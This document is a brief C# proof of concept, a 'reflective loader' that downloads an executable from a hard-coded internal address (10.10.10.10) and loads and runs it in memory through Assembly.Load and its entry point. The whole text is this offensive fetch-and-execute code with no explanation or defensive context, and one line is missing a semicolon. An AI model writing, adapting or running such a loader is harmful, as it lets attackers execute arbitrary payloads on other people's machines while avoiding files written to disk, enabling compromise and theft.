# POC
```cs
using System;
using System.Net;
using System.Reflection;

namespace ReflectiveLoader
{
    class Program
    {
        static void Main(string[] args)
        {
            String url = ("http://10.10.10.10/payload.exe");
            WebClient client = new WebClient();
            byte[] programBytes = client.DownloadData(url);
            Assembly dotnetProgram = Assembly.Load(programBytes);
            object[] parameters = new String[] { null };
            dotnetProgram.EntryPoint.Invoke(null, parameters)
        }
    }
}
```